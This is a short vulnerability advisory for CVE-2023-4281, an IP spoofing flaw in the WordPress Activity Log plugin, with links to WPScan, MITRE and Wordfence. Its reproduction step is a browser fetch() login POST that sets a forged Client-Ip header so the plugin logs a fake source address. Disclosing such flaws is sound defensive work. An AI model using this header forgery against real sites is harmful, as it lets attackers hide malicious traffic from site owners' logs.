**CVE ID:** CVE-2023-4281

**Vulnerability Type:** IP Address Spoofing

**Description:** The Activity Log plugin retrieves client IP addresses from potentially untrusted headers, allowing an attacker to manipulate its value. This may be used to hide the source of malicious traffic.

**Steps to reproduce:** 
```
Run the following code in the web browser and note on the backend that the IP address has been faked.

await fetch("/wp-login.php", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
    "Client-Ip": "8.8.8.8",
  },
  "body": "log=USERNAME&pwd=PASSWORD",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
``` 

**Reference:** 
1. https://wpscan.com/vulnerability/f5ea6c8a-6b07-4263-a1be-dd033f078d49
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4281
3. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/aryo-activity-log/activity-log-287-ip-address-spoofing
